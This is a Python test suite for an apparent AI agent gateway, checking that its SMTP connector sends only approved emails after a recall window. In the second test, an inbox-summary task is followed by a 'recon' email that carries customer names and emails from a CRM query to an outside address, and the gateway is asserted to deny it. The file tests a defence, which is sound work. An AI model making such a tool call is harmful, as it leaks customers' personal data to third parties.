"""E7: the SMTP connector delivers only what KAVACH let go, after its window, and never what it refused."""
import tempfile
import time

from kavach.connectors import SmtpMailer
from kavach.environment import MAIL_RECALL_S, Environment
from kavach.gateway import GatewayConfig, Kavach
from kavach.models import ToolCall, Verdict


class FakeSMTP:
    sent: list = []
    fail = False

    def __init__(self, host, port, timeout=None):
        self.host, self.port = host, port

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def starttls(self):
        pass

    def login(self, u, p):
        pass

    def send_message(self, m, from_addr=None, to_addrs=None):
        if FakeSMTP.fail:
            raise ConnectionRefusedError("mail server down")
        FakeSMTP.sent.append((m, to_addrs))
        return {}


def gateway():
    FakeSMTP.sent, FakeSMTP.fail = [], False
    gw = Kavach(Environment(tempfile.mkdtemp()), GatewayConfig(use_llm_judge=False))
    gw.env.mailer = SmtpMailer("mailpit", 1025, smtp=FakeSMTP)
    return gw


def test_an_allowed_email_leaves_by_smtp_only_after_its_recall_window():
    gw = gateway()
    tid, _ = gw.start_task("ravi", "analyst", "Email john.menon@client4.com that invoice 1042 is being processed.")
    d = gw.run(tid, ToolCall("mail.send", {"to": "john.menon@client4.com", "subject": "Invoice 1042",
                                           "body": "Hi John, invoice 1042 is being processed. Regards, Ravi"}))
    assert d.verdict == Verdict.ALLOW_WITH_SAFEGUARD and "queued" in d.result
    assert FakeSMTP.sent == []                                            # still recallable: nothing left yet
    gw.settle(time.time() + MAIL_RECALL_S + 1)
    (m, rcpts), = FakeSMTP.sent
    assert rcpts == ["john.menon@client4.com"] and m["Subject"] == "Invoice 1042"
    assert m["X-Kavach-Outbox"] == gw.env.outbox[-1]["id"] and gw.env.outbox[-1]["delivered"]["refused"] == []


def test_a_recalled_or_refused_email_never_reaches_the_mail_server():
    gw = gateway()
    tid, _ = gw.start_task("ravi", "analyst", "Email john.menon@client4.com that invoice 1042 is being processed.")
    d = gw.run(tid, ToolCall("mail.send", {"to": "john.menon@client4.com", "subject": "Invoice 1042",
                                           "body": "Hi John, invoice 1042 is being processed. Regards, Ravi"}))
    assert gw.undo_action(d.receipt_id)["undone"]
    t2, _ = gw.start_task("asha", "support", "Summarise my inbox.")
    inbox = gw.run(t2, ToolCall("mail.read_inbox", {}))
    leak = gw.run(t2, ToolCall("mail.send", {"to": "billing@acme-invoices.co", "subject": "recon",
                                             "body": str(gw.env.crm_query("SELECT name, email FROM customers")[:5])}))
    assert inbox.executed and leak.verdict == Verdict.DENY
    gw.settle(time.time() + MAIL_RECALL_S + 1)
    assert FakeSMTP.sent == []


def test_a_mail_server_failure_is_recorded_not_lost():
    gw = gateway()
    FakeSMTP.fail = True
    gw.env.mail_send("john.menon@client4.com", "s", "b")
    assert gw.env.outbox[-1]["delivery_error"].startswith("ConnectionRefusedError")


def test_from_env():
    assert SmtpMailer.from_env({}) is None
    m = SmtpMailer.from_env({"KAVACH_SMTP_HOST": "mailpit", "KAVACH_SMTP_PORT": "1025"})
    assert (m.host, m.port, m.sender, m.starttls) == ("mailpit", 1025, "agent@infycorp.com", False)
